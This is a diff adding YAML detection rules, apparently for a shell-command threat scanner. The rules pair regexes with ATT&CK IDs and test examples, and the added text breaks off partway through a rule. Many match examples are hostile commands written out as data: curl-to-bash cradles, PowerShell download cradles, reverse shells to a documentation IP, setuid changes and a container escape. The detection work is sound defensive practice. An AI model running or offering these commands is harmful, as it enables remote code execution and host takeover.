@@ -1,0 +1,462 @@
+# Transfer and execution. A downloader feeding an interpreter matches wherever the downloader sits, on any line; every
+# other tool matches only at the command position, on the first line.
+#
+# Placeholders such as {cmd}, {line}, {stage}, {anystage}, {pre}, {seg}, {word} and {end} are described in rules.py.
+
+# Linear: the scan from a downloader stops at the next downloader word, so no two starts scan the same text.
+- id: download-pipe-shell
+  match:
+    regex: '(?<![\w.-])(?:curl|wget)(?![\w-])(?:(?!(?<![\w.-])(?:curl|wget)(?![\w-])).)*?\|[^\S\n]*{pre}(?:ba|z|da|k|a)?sh{end}(?![^\S\n]+-[A-Za-z]*c)|{anystage}(?:(?:ba|z|da|k|a)?sh|source|\.|eval)(?=\s)[^|;&(){}`\n]*?(?:<\(|\$\(|`)[^\S\n]*{pre}(?:curl|wget){end}'
+  meaning: Downloads a script and pipes it straight into a shell, so it runs without being saved.
+  techniques: [T1105, T1059.004]
+  artifacts: [URL, Shell Script]
+  iocs: [url, ipv4, domain]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "curl -s hxxp://203.0.113[.]5/x.sh | bash"
+      - "wget -qO- hxxps://evil[.]top/i | sh"
+      - "curl -fsSL hxxps://evil[.]top/i | sudo -E bash -"
+      - 'bash -c "$(curl -fsSL hxxps://evil[.]top/i)"'
+      - "bash <(curl -s hxxp://203.0.113[.]5/x.sh)"
+      - "(curl -s hxxp://203.0.113[.]5/x || wget -qO- hxxp://203.0.113[.]5/x) | sh"
+      - "busybox wget -qO- hxxp://203.0.113[.]5/x | busybox sh"
+      - "cd /tmp\ncurl -s hxxp://203.0.113[.]5/x.sh | bash"
+      - "pwd\nbash <(curl -s hxxp://203.0.113[.]5/x.sh)"
+    no_match:
+      - "curl -s hxxp://203.0.113[.]5/x.sh -o /tmp/x.sh"
+      - "curl -s hxxp://203.0.113[.]5/x | shasum"
+      - "curl -s hxxp://203.0.113[.]5/x | sh -c 'cat > /tmp/x'"
+      - "cat > x.sh <<EOF\nbash <(curl -s hxxp://203.0.113[.]5/x.sh)\nEOF"  # a script being written
+
+- id: download-pipe-python
+  match:
+    regex: '(?<![\w.-])(?:curl|wget)(?![\w-])(?:(?!(?<![\w.-])(?:curl|wget)(?![\w-])).)*?\|[^\S\n]*{pre}python[0-9.]*(?:[^\S\n]+-{end}|[^\S\n]*(?:$|[\n|;&)`}]))|{anystage}python[0-9.]*(?=\s)[^|;&(){}`\n]*?(?:<\(|\$\(|`)[^\S\n]*{pre}(?:curl|wget){end}'
+  meaning: Downloads a Python script and pipes it straight into the interpreter, so it runs without being saved.
+  techniques: [T1105, T1059.006]
+  artifacts: [URL, Python Script File]
+  iocs: [url, ipv4, domain]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "curl -s hxxp://203.0.113[.]5/x.py | python3"
+      - "wget -qO- hxxp://203.0.113[.]5/x.py | sudo python3 -"
+      - 'python3 -c "$(curl -fsSL hxxp://203.0.113[.]5/x.py)"'
+    no_match:
+      - "curl -s hxxp://203.0.113[.]5/a.json | python3 -m json.tool"
+      - "curl -s hxxp://203.0.113[.]5/x.py -o x.py"
+
+# ATT&CK 20.0 has no Perl sub-technique of T1059, so the parent is the most specific one.
+- id: download-pipe-perl
+  match:
+    regex: '(?<![\w.-])(?:curl|wget)(?![\w-])(?:(?!(?<![\w.-])(?:curl|wget)(?![\w-])).)*?\|[^\S\n]*{pre}perl(?:[^\S\n]+-{end}|[^\S\n]*(?:$|[\n|;&)`}]))|{anystage}perl(?=\s)[^|;&(){}`\n]*?(?:<\(|\$\(|`)[^\S\n]*{pre}(?:curl|wget){end}'
+  meaning: Downloads a Perl script and pipes it straight into the interpreter, so it runs without being saved.
+  techniques: [T1105, T1059]
+  artifacts: [URL, Executable Script]
+  iocs: [url, ipv4, domain]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "wget -qO- hxxp://203.0.113[.]5/x.pl | perl"
+      - "curl -s hxxp://203.0.113[.]5/x.pl | perl -"
+    no_match:
+      - "curl -s hxxp://203.0.113[.]5/x | perl -ne 'print'"
+      - "perl -e 'print 1'"
+
+# Linear: a tempered prefix walks to the first trigger word, so the line has one start. One ^ in front of both
+# branches, so like {cmd} the rule reads the first line only and from one start, and each tempered prefix is taken
+# whole through (?=(...))\N, so a failed match never backtracks through it.
+- id: powershell-download-cradle
+  match:
+    regex: '(?i)^(?:(?=((?:(?!\b(?:iex|invoke-expression)\b).)*))\1\b(?:iex|invoke-expression)\b.*\b(?:downloadstring|invoke-webrequest|iwr|irm|invoke-restmethod)\b|(?=((?:(?!\b(?:downloadstring|iwr|irm|invoke-webrequest|invoke-restmethod)\b).)*))\2\b(?:downloadstring|iwr|irm|invoke-webrequest|invoke-restmethod)\b.*\|\s*(?:iex|invoke-expression)\b)'
+  meaning: Downloads PowerShell code and runs it in memory without saving it.
+  techniques: [T1105, T1059.001]
+  artifacts: [URL, PowerShell Script]
+  iocs: [url, ipv4, domain]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "IEX (New-Object Net.WebClient).DownloadString('hxxp://203.0.113[.]5/a.ps1')"
+      - "iwr hxxps://evil[.]top/p.ps1 | iex"
+      - "iex (irm hxxps://evil[.]top/p.ps1)"
+    no_match:
+      - "Invoke-WebRequest hxxps://evil[.]top/f.zip -OutFile f.zip"
+
+# powershell -e, -ec, -enc and -EncodedCommand (any prefix PowerShell accepts), with - or /. A payload of 200 or more
+# base64 characters is stored as a <blob ...> marker, which still follows the switch.
+- id: powershell-encoded
+  match:
+    regex: '(?i){stage}(?:powershell|pwsh)(?:\.exe)?(?:[^\S\n]+{word}+){0,16}?[^\S\n]+[-/]e(?:c|n[a-z]*)?{end}'
+  meaning: Runs a base64-encoded PowerShell command, which hides what it does from a casual reader.
+  techniques: [T1059.001, T1027.010]
+  artifacts: [PowerShell Script]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "powershell -NoProfile -EncodedCommand RwBlAHQALQBEAGEAdABlAA=="
+      - "pwsh -enc RwBlAHQALQBEAGEAdABlAA=="
+      - 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -e RwBlAHQALQBEAGEAdABlAA=='
+    no_match:
+      - "powershell -ExecutionPolicy Bypass -File a.ps1"
+      - "powershell -ep bypass -c Get-Date"
+      - "cat > n.txt <<'EOF'\nthen; powershell -enc RwBlAHQALQBEAGEAdABlAA==\nEOF"  # a later line, in a note
+
+- id: bits-download
+  match:
+    regex: '(?i){cmd}(?:bitsadmin(?:\.exe)?(?=\s).*?[-/](?:transfer|addfile)\b|start-bitstransfer\b)'
+  meaning: Downloads a file with a Windows BITS job, a background transfer that can outlive the session.
+  techniques: [T1105, T1197]
+  artifacts: [URL, File]
+  iocs: [url, ipv4, domain, path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - 'bitsadmin /transfer j /download /priority high hxxp://203.0.113[.]5/a.exe C:\Users\Public\a.exe'
+      - "Start-BitsTransfer -Source hxxps://evil.example[.]com/a.exe -Destination a.exe"
+    no_match:
+      - "bitsadmin /list /allusers"
+      - "Get-BitsTransfer"
+
+- id: windows-download
+  match:
+    regex: '(?i){cmd}(?:certutil(?:\.exe)?(?=\s).*?[-/]urlcache\b|(?:iwr|invoke-webrequest|irm|invoke-restmethod|curl|wget)(?:\.exe)?(?=\s).*?\s-outf)|\.downloadfile(?:async)?\s*\('
+  meaning: Downloads a file from a remote host to disk with a Windows tool.
+  techniques: [T1105]
+  artifacts: [URL, File]
+  iocs: [url, ipv4, domain, path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "certutil -urlcache -split -f hxxp://203.0.113[.]5/a.exe a.exe"
+      - '(New-Object Net.WebClient).DownloadFile(''hxxp://203.0.113[.]5/a.exe'', ''C:\Users\Public\a.exe'')'
+      - "Invoke-WebRequest hxxps://evil[.]top/f.zip -OutFile f.zip"
+      - "iwr hxxps://evil[.]top/f.zip -OutFile f.zip"
+    no_match:
+      - "certutil -hashfile a.exe SHA256"
+      - "Invoke-WebRequest hxxps://evil[.]top/"
+
+# curl's output options may be clustered (-sLo, -fsSLo, -LO, -sO): the cluster holds only curl's flags that take no
+# argument before the o or O, so a glued argument such as -Hfoo is not read as an output option. The scan stops at
+# a pipe, so curl ... | grep -o is not a download, and a probe that saves nothing (-o /dev/null, wget -O /dev/null)
+# is not one either, nor is a status probe (-w, --write-out, -I, --head, wget --spider). A download piped into tar
+# extracting or tee writing a file (curl ... | tar xz, curl ... | sudo tee /opt/x) is written to disk too. Any command of the first line counts (cd /tmp && wget ...), and each scan stays inside its
+# command ({seg}).
+- id: download-file
+  match:
+    regex: '{stage}(?:wget(?:\.exe)?{end}(?!{seg}*?[^\S\n]--spider(?![\w-]))(?!{seg}*?[^\S\n](?:-[A-Za-z]*O|--output-document)(?![\w-])[=\s]*["\x27]?/dev/null(?![^\s|;&()<>]))|curl(?:\.exe)?{end}(?!{seg}*?[^\S\n](?:-[A-Za-z]*[wI][A-Za-z]*|--write-out|--head)(?![\w-])){seg}*?(?:[^\S\n](?:-[sSLfkviIgGNjlnqRZ46#]*o|--output(?![\w-]))(?![=\s]*["\x27]?/dev/null(?![^\s|;&()<>]))|[^\S\n](?:-[sSLfkviIgGNjlnqRZ46#]*O|--(?:remote-name|remote-name-all|output-dir))(?![\w-])|(?<![0-9&>])>(?!>?[^\S\n]*/dev/null)|\|[^\S\n]*{pre}(?:(?:tar|bsdtar){end}(?:[^\S\n]+(?!-)[A-Za-z]*x[A-Za-z]*{end}|(?=(?:[^\S\n]+{word}+){0,16}?[^\S\n]+(?:-[A-Za-z]*x[A-Za-z]*|--extract|--get){end}))|tee(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?!["\x27]?/dev/null(?![^\s|;&()<>]))["\x27]?[^\s|;&()<>{}`-]))|tftp(?:\.exe)?{end}{seg}*?(?:[^\S\n]-[A-Za-z]*g|[^\S\n](?i:get)(?=\s)))'
+  meaning: Downloads a file from a remote host to disk.
+  techniques: [T1105]
+  artifacts: [URL, File]
+  iocs: [url, ipv4, domain, path]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "wget hxxp://203.0.113[.]5/xmrig"
+      - "curl -s hxxp://evil[.]ru/a -o /tmp/a"
+      - "curl -fsSLo /tmp/a hxxp://evil[.]ru/a"
+      - "curl -LO hxxp://evil[.]ru/a"
+      - "curl -s hxxp://evil[.]ru/a > /tmp/a"
+      - "busybox wget hxxp://203.0.113[.]5/a"
+      - "nohup /usr/bin/wget -q hxxp://203.0.113[.]5/a &"
+      - "tftp -g -r a 203.0.113[.]5"
+      - "sudo -u www-data curl -sO hxxp://evil[.]ru/a"
+      - "cd /tmp && wget hxxp://203.0.113[.]5/x"
+      - "curl -sL hxxp://203.0.113[.]5/t.tgz | tar xz -C /opt"
+      - "curl -s hxxp://203.0.113[.]5/k | sudo tee /opt/k"
+    no_match:
+      - "curl -s hxxp://evil[.]ru/a"
+      - "curl -s hxxp://evil[.]ru/a 2>/dev/null"
+      - "curl -H 'Host: foo' hxxp://evil[.]ru/a"
+      - "cat ~/.wgetrc"
+      - "curl -s hxxp://evil[.]ru/a | grep -o 'x'"
+      - "curl -so /dev/null -w '%{http_code}' hxxp://evil[.]ru/a"
+      - "wget -q -O /dev/null hxxp://evil[.]ru/a"
+      - "curl -s hxxp://evil[.]ru/a; echo > /tmp/x"
+      - "curl -s -o /tmp/r -w '%{http_code}' hxxp://evil[.]ru/a"
+      - "curl -I hxxp://evil[.]ru/a"
+      - "curl -s hxxp://evil[.]ru/a | tee /dev/null"
+      - "curl -s hxxp://evil[.]ru/a | tar tz"
+
+# git clone of a repository brings its code onto the host: a tool, most often.
+- id: git-clone
+  match:
+    regex: '{stage}git(?:[^\S\n]+-[Cc][^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+clone{end}'
+  meaning: Clones a git repository onto the host, usually to bring in a tool.
+  techniques: [T1105]
+  artifacts: [URL, File]
+  iocs: [url, domain, ipv4]
+  confidence: medium
+  examples:
+    match: ["git clone hxxps://github[.]com/example/tool.git", "git clone --depth 1 hxxp://203.0.113[.]5/tool.git /opt/t",
+            "cd /opt && git clone hxxps://github[.]com/example/tool"]
+    no_match: ["git status", "git log --oneline", "git pull", "echo git clone"]
+
+# A shell wired to a network socket: a /dev/tcp redirection that also feeds stdin (0>&1, 0<&1) or follows sh -i,
+# exec N<>/dev/tcp/..., nc or ncat running a shell with -e or -c, the mkfifo loop (a shell piped into nc, whose
+# output goes back to a file), nc piped into a shell, and socat with exec: or system:. A one-way /dev/tcp write (a
+# port check) and a command piped into nc (which only sends its output) are not shells.
+- id: reverse-shell
+  match:
+    regex: '/dev/(?:tcp|udp)/[^\s|;&()<>/]*/[^\s|;&()<>/]*(?:[^\S\n]+[0-9]*[<>]&[^\S\n]*[0-9]+){0,4}[^\S\n]+0[<>]&[^\S\n]*[0-9]|[^\S\n]-[A-Za-z]*i[^\S\n]+[0-9]*(?:<>|>&|&>|[<>])[^\S\n]*/dev/(?:tcp|udp)/|{line}exec[^\S\n]+[0-9]+<>[^\S\n]*/dev/(?:tcp|udp)/|{cmd}(?:(?:nc|ncat|netcat)(?:\.traditional|\.openbsd)?{end}(?:[^\S\n]+{word}+){0,16}?[^\S\n]+(?:-[A-Za-z]*[ec][^\S\n]*|--(?:sh-exec|exec)(?:=|[^\S\n]+))["\x27]?(?:[^\s|;&()<>"\x27`]*/)?(?:ba|z|da|k|a)?sh{end}|socat{end}.*?(?i:exec|system):)|{stage}(?:(?:ba|z|da|k|a)?sh{end}{seg}*\|[^\S\n]*{pre}(?:nc|ncat|netcat)(?:\.traditional|\.openbsd)?{end}{seg}*?(?<![0-9&>])>>?[^\S\n]*[^\s|;&()<>]|(?:nc|ncat|netcat)(?:\.traditional|\.openbsd)?{end}{seg}*\|[^\S\n]*{pre}(?:ba|z|da|k|a)?sh{end})'
+  meaning: Connects a shell to a remote host over a raw network socket, giving the attacker an interactive shell.
+  techniques: [T1059.004, T1095]
+  artifacts: [Network Traffic, Shell Command]
+  iocs: [ipv4, domain, port, path]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "bash -i >& /dev/tcp/203.0.113[.]5/4444 0>&1"
+      - "sh -i >& /dev/udp/203.0.113[.]5/53 0>&1"
+      - "/bin/bash -l > /dev/tcp/203.0.113[.]5/4444 0<&1 2>&1"
+      - "exec 5<>/dev/tcp/203.0.113[.]5/4444"
+      - "nc -e /bin/sh 203.0.113[.]5 4444"
+      - "ncat 203.0.113[.]5 4444 -e /bin/bash"
+      - "cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113[.]5 4444 >/tmp/f"
+      - "nc -lvnp 4444 | /bin/sh"
+      - "socat exec:'bash -li',pty,stderr tcp:203.0.113[.]5:4444"
+    no_match:
+      - "echo > /dev/tcp/203.0.113[.]5/22"
+      - "nc -zv 203.0.113[.]5 22"
+      - "mkfifo /tmp/f"
+      - "socat TCP-LISTEN:4444,fork TCP:10.0.0[.]5:22"
+      - "cat /etc/passwd | nc 203.0.113[.]5 4444"
+      - "bash -i 2>&1 | nc 203.0.113[.]5 4444"
+
+# The Windows form, nc -e cmd.exe, in any case: Windows Command Shell (T1059.003) over a raw socket. Only cmd.exe is
+# matched, since that is what the technique names; nc -e powershell.exe would be T1059.001 and is left to the model.
+- id: windows-reverse-shell
+  match:
+    regex: '(?i){cmd}(?:nc|ncat|netcat|nc64)(?:\.exe)?{end}(?:[^\S\n]+{word}+){0,16}?[^\S\n]+(?:-[a-z]*[ec][^\S\n]*|--(?:sh-exec|exec)(?:=|[^\S\n]+))["\x27]?(?:[^\s|;&()<>"\x27`]*[/\\])?cmd(?:\.exe)?{end}'
+  meaning: Connects a Windows command shell to a remote host over a raw network socket.
+  techniques: [T1059.003, T1095]
+  artifacts: [Network Traffic, Shell Command]
+  iocs: [ipv4, domain, port, path]
+  confidence: high
+  platforms: [windows]
+  examples:
+    match:
+      - "nc.exe -e cmd.exe 203.0.113[.]5 4444"
+      - "ncat -e cmd.exe 203.0.113[.]5 4444"
+      - 'C:\Users\Public\nc64.exe 203.0.113[.]5 443 -e cmd.exe'
+    no_match:
+      - "nc -e /bin/sh 203.0.113[.]5 4444"
+      - "nc.exe -zv 203.0.113[.]5 445"
+      - "nc.exe -e powershell.exe 203.0.113[.]5 4444"
+
+- id: suid-shell
+  match:
+    regex: '{cmd}chmod(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?:(?:[go]*[ua][ugoa]*)?[+=][rwxXt]*s[rwxXst]*|0?[4-7][0-7]{3}){end}'
+  meaning: Sets the setuid bit, so a shell or binary runs as its owner (often root) for whoever starts it.
+  techniques: [T1548.001]
+  artifacts: [Local File Permissions]
+  iocs: [path]
+  confidence: high
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "chmod u+s /bin/bash"
+      - "chmod 4755 /tmp/.x/sh"
+      - "chmod +s /usr/bin/find"
+      - "sudo chmod 6755 /tmp/rootsh"
+    no_match:
+      - "chmod 755 /tmp/x"
+      - "chmod g+s /srv/shared"
+      - "chmod 2755 /srv/shared"
+
+# Making a file executable. Directory permissions are not this, so the heuristic is:
+# - a symbolic mode that adds x (+x, u+x, a+rx, u=rwx) always matches;
+# - a numeric mode with an execute bit (an odd digit among the last three, as in 755 or 0711) matches only without
+#   -R or --recursive, and only when the first operand is not a known directory: one that ends in /, ., .., ~,
+#   $HOME, /home/<user>, or a path whose last part is .ssh, .gnupg, tmp, shm, www, html, public_html, htdocs, home,
+#   root, opt or srv.
+- id: chmod-exec
+  match:
+    regex: '{cmd}chmod(?:(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?=[ugoa+=,rwxXst-]*[+=][rwXst]*x)[ugoa+=,rwxXst-]+{end}|(?:[^\S\n]+-[A-QS-Za-z]+|[^\S\n]+--(?!recursive)[\w=-]*){0,8}[^\S\n]+0?[0-7]?(?:[1357][0-7]{2}|[0-7][1357][0-7]|[0-7]{2}[1357])[^\S\n]+(?!["\x27]?(?:[^\s|;&()<>"\x27`]*/)?(?:\.ssh|\.gnupg|tmp|shm|www|html|public_html|htdocs|home|root|opt|srv|\.\.?|~|\$\{?HOME\}?)?/?["\x27]?(?![^\s|;&()<>])|["\x27]?/home/[^\s|;&()<>"\x27`/]+/?["\x27]?(?![^\s|;&()<>]))[^\s|;&()<>])'
+  meaning: Makes a file executable, typically a payload that was just downloaded.
+  techniques: [T1222.002]
+  artifacts: [File]
+  iocs: [path]
+  confidence: medium
+  platforms: [linux, macos]
+  examples:
+    match:
+      - "chmod +x /tmp/kdevtmpfsi"
+      - "chmod 777 xmrig"
+      - "chmod 755 .s2"
+      - "chmod u+x,g+x ./run"
+      - "sudo chmod 0755 /usr/local/bin/x"
+      - "chmod -R +x /tmp/.x"
+    no_match:
+      - "chmod 644 notes.txt"
+      - "chmod 700 ~/.ssh"
+      - "chmod 755 /var/www/html"
+      - "chmod -R 755 /opt/app"
+      - "chmod 600 /tmp/key"
+      - "chmod 755 /tmp/"
+      - "chmod 711 /home/john"
+      - "chmod -R u+rwX /srv/app"
+
+- id: base64-decode
+  match:
+    regex: '(?i){stage}base64(?:[^\S\n]+-w[^\S\n]+[0-9]+|[^\S\n]+-{word}*){0,8}?[^\S\n]+-(?:(?=[a-z]*d)[a-z]+|-decode){end}|\[(?:system\.)?convert\]::frombase64string\s*\('
+  meaning: Decodes base64-encoded content, often a hidden command or payload.
+  techniques: [T1140]
+  artifacts: [Script]
+  iocs: []
+  confidence: medium
+  examples:
+    match:
+      - "echo aGVsbG8= | base64 -d"
+      - "[Convert]::FromBase64String($s)"
+      - "[System.Convert]::FromBase64String($s)"
+      - "base64 -di p.b64 > p"
+      - "cat x | base64 --decode"
+      - "echo aGVsbG8= | base64 -w0 -D"
+    no_match:
+      - "base64 notes.txt"
+      - "base64 -w0 /etc/passwd"
+      - "cat > notes.txt <<'EOF'\nTODO\necho aGVsbG8= | base64 -d\nEOF"  # a later line, in a note
+      - 'grep "base64 -d" notes.txt'
+
+# Python code given on the command line (-c, which may close a cluster of flags such as -uc) or read from stdin (-).
+# Flags may come first, and -W and -X with their argument (-W ignore). A script file or a module (-m) is left to the
+# model.
+- id: python-exec
+  match:
+    regex: '{cmd}python[0-9.]*(?:\.exe)?{end}(?:[^\S\n]+(?:-(?![-c])[A-BD-Za-bd-z]*[WX][^\S\n]+[^\s|;&()<>{}`-]{word}*|-(?![-c])[A-Za-z]+{end})){0,8}[^\S\n]+(?:-[A-Za-z]*c|-){end}'
+  meaning: Runs Python code given on the command line or on standard input.
+  techniques: [T1059.006]
+  artifacts: [Script]
+  confidence: high
+  examples:
+    match: ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", 'python -c "print(1)"', "python3 -u -c 'x'",
+            "python3 - <<EOF", "python3 -c \"\nimport sys\nprint('hello')\n\"", "python3 -W ignore -c 'x'"]
+    no_match: ["python3 -m http.server 8000", "python3 x.py", "python3 --version", "pythonista -c x",
+               "python3 -W ignore x.py"]
+
+# APT and dpkg hook options run a shell command: apt-get -o APT::Update::Pre-Invoke::=..., -o Dpkg::Pre-Invoke::=...,
+# dpkg --pre-invoke=.... -o may close a cluster of flags (-qqo). Under sudo this is also a known way out of a sudo rule
+# that allows only apt.
+- id: apt-hook-exec
+  match:
+    regex: '{stage}(?:(?:apt|apt-get|aptitude){end}{seg}*?[^\S\n](?:-[A-Za-z]*o[^\S\n]*|--option(?:=|[^\S\n]+))["\x27]?(?i:apt|dpkg)::[\w:-]*?(?i:(?:pre|post)-invoke)|dpkg{end}{seg}*?[^\S\n]--(?:pre|post)-invoke=)'
+  meaning: Runs a shell command through a package manager's hook option (APT or dpkg Pre-Invoke or Post-Invoke).
+  techniques: [T1059.004]
+  artifacts: [Process]
+  confidence: high
+  platforms: [linux]
+  examples:
+    match:
+      - 'apt-get update -o APT::Update::Pre-Invoke::="/tmp/x"'
+      - "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+      - 'apt-get install -y -o Dpkg::Pre-Invoke::="/tmp/x" htop'
+      - "dpkg --pre-invoke=/tmp/x -i x.deb"
+      - "apt-get -qqo Dpkg::Pre-Invoke::=/tmp/x install htop"
+    no_match: ["apt-get update", "apt-get -o Dpkg::Options::=--force-confnew install x", "dpkg -i x.deb"]
+
+# Escape to the host: a privileged container that also mounts the host's root, chroots into it or shares the host's
+# PID namespace; a container that mounts the host's root and chroots into it; nsenter into PID 1's namespaces.
+- id: container-escape
+  match:
+    regex: '{stage}(?:docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:container[^\S\n]+)?(?:run|create){end}(?:(?={seg}*?[^\S\n]--privileged{end})(?={seg}*?(?:[^\S\n](?:-v|--volume)(?:=|[^\S\n]+)["\x27]?/:|[^\S\n]--mount[=\s][^\s|;&()<>]*source=/,|[^\S\n]chroot[^\S\n]+/|[^\S\n]--pid[=\s]host{end}))|(?={seg}*?[^\S\n](?:-v|--volume)(?:=|[^\S\n]+)["\x27]?/:)(?={seg}*?[^\S\n]chroot[^\S\n]+/))|nsenter{end}(?={seg}*?[^\S\n](?:-t[^\S\n]*1|--target[=\s]1){end}))'
+  meaning: Starts a container set up to reach the host itself (privileged with the host's root mounted, or chrooting into it), or enters the host's namespaces with nsenter.
+  techniques: [T1611]
+  artifacts: [Container]
+  confidence: high
+  platforms: [linux]
+  examples:
+    match:
+      - "docker run --rm -it --privileged -v /:/host alpine chroot /host"
+      - "docker run -d --pid=host --privileged x"
+      - "docker run -v /:/mnt alpine chroot /mnt"
+      - "nsenter -t 1 -m -u -i -n -p -- sh"
+    no_match: ["docker run -d --privileged x", "docker run -v /data:/data x", "nsenter -t 4242 -n ip a"]
+
+# Containers. docker run, create and compose up deploy a container (T1610); docker exec and kubectl exec run a command
+# in one (T1609); docker build builds an image on the host (T1612); docker pull brings an image in (T1105). Global
+# options that take an argument (-H host, --context x, compose -f file) are skipped with it. A container set up to
+# reach the host is container-escape (above); listing containers is container-discovery, and logs are context.
+- id: container-deploy
+  match:
+    regex: '{stage}(?:docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:(?:container[^\S\n]+)?(?:run|create)|compose(?:[^\S\n]+(?:-[fp]|--file|--project-name|--env-file|--profile)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:up|run))|docker-compose(?:[^\S\n]+(?:-[fp]|--file|--project-name|--env-file|--profile)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:up|run)){end}'
+  meaning: Starts a new container from an image.
+  techniques: [T1610]
+  artifacts: [Container]
+  confidence: medium
+  examples:
+    match: ["docker run -d --name x alpine sleep 1000", "docker run --rm -it -v /srv:/srv alpine sh",
+            "sudo docker compose up -d", "docker-compose -f x.yml up -d", "docker -H tcp://10.0.0[.]5:2375 run alpine"]
+    no_match: ["docker ps", "docker stop web", "docker images", "docker exec -it web sh", "echo docker run"]
+
+- id: container-exec
+  match:
+    regex: '{stage}(?:docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:container[^\S\n]+)?exec|(?:docker[^\S\n]+compose|docker-compose)(?:[^\S\n]+(?:-[fp]|--file|--project-name)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+exec|kubectl(?:[^\S\n]+(?:-n|--namespace|--context|--kubeconfig)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+exec){end}'
+  meaning: Runs a command inside a running container.
+  techniques: [T1609]
+  artifacts: [Container]
+  confidence: medium
+  examples:
+    match: ["docker exec -it web bash", "sudo docker container exec web id", "docker compose exec api sh",
+            "kubectl -n prod exec -it pod-1 -- sh"]
+    no_match: ["docker ps", "docker run -d nginx", "kubectl get pods", "echo docker exec"]
+
+- id: container-build
+  match:
+    regex: '{stage}docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:(?:image|buildx)[^\S\n]+)?build{end}'
+  meaning: Builds a container image on the host.
+  techniques: [T1612]
+  artifacts: [Container Image]
+  confidence: medium
+  examples:
+    match: ["docker build -t tool .", "sudo docker image build -t x -f Dockerfile .", "docker buildx build ."]
+    no_match: ["docker images", "docker run -d x", "make build"]
+
+- id: container-pull
+  match:
+    regex: '{stage}(?:docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:(?:image|compose)[^\S\n]+)?pull|docker-compose(?:[^\S\n]+-{word}*){0,8}[^\S\n]+pull){end}'
+  meaning: Pulls a container image from a registry onto the host.
+  techniques: [T1105]
+  artifacts: [Container Image]
+  confidence: medium
+  examples:
+    match: ["docker pull alpine:latest", "sudo docker image pull registry.example[.]com/tool", "docker compose pull"]
+    no_match: ["docker push x", "docker images", "git pull"]
+
+# Containers stopped, killed or force-removed (docker rm -f stops a running one), and compose stop, down or kill:
+# the services they run go down (Service Stop, T1489). A kill with a signal other than KILL, TERM, INT, QUIT or ABRT
+# (by name, with or without SIG, or by number) does not end the service: HUP and USR1 often ask it to reload.
+- id: container-stop
+  match:
+    regex: '{stage}(?:docker(?:[^\S\n]+(?:-[Hc]|--host|--context|--config|--log-level)[^\S\n]+[^\s|;&()<>{}`-]{word}*|[^\S\n]+-{word}*){0,8}[^\S\n]+(?:container[^\S\n]+)?(?:stop{end}|kill{end}(?!(?:[^\S\n]+{word}+){0,8}?[^\S\n]+(?:-s|--signal)(?:=|[^\S\n]*)["\x27]?(?=[^\s"\x27=])(?!(?i:(?:SIG)?(?:KILL|TERM|INT|QUIT|ABRT))["\x27]?{end}|(?:9|15|2|3|6)["\x27]?{end}))|rm{end}(?=(?:[^\S\n]+{word}+){0,8}?[^\S\n]+(?:-[A-Za-z]*f[A-Za-z]*|--force){end}))|(?:docker[^\S\n]+compose|docker-compose)(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?:(?:stop|down){end}|kill{end}(?!(?:[^\S\n]+{word}+){0,8}?[^\S\n]+(?:-s|--signal)(?:=|[^\S\n]*)["\x27]?(?=[^\s"\x27=])(?!(?i:(?:SIG)?(?:KILL|TERM|INT|QUIT|ABRT))["\x27]?{end}|(?:9|15|2|3|6)["\x27]?{end}))))'
+  meaning: Stops, kills or force-removes running containers, which takes down the services they run.
+  techniques: [T1489]
+  artifacts: [Container]
+  confidence: medium
+  examples:
+    match: ["docker stop web", "docker stop $(docker ps -q)", "docker kill web", "docker rm -f web",
+            "docker compose down", "docker kill -s KILL web", "docker kill --signal=SIGTERM web"]
+    no_match: ["docker rm web", "docker ps", "docker start web", "docker kill -s HUP web",
+               "docker kill --signal=SIGUSR1 web", "docker compose kill -s HUP"]
+
+# systemctl start and restart run a service's program (Systemctl, T1569.003). enable and link are persistence
+# (systemd-service); stopping a security tool or the firewall is evasion (40-evasion.yaml).
+- id: service-start
+  match:
+    regex: '{stage}systemctl(?:[^\S\n]+-{word}*){0,8}[^\S\n]+(?:start|restart|try-restart|reload-or-restart){end}'
